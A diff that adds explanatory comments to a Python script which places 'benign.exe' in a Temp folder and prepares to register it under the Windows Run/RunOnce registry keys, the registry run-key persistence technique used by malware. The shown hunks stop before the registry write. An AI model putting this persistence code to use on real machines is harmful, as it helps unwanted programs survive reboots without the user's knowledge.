@@ -1,9 +1,12 @@
+# Import necessary modules for file operations and registry manipulation
 import os, shutil, winreg
 
+# Define directory and filename for the executable
 filedir = os.path.join(os.getcwd(),"Temp")
 filename = "benign.exe"
 filepath = os.path.join(filedir,filename)
 
+# Check if the file exists and remove it if it does
 if os.path.isfile(filepath):
     os.remove(filepath)
 
@@ -20,8 +23,9 @@ shutil.move(filename,filedir)
 # HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 # HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 
-regkey = 1
+regkey = 1 # Set registry key selection value
 
+# Determine the registry hive based on the regkey value
 if regkey < 2:
     reghive = winreg.HKEY_CURRENT_USER
 else:
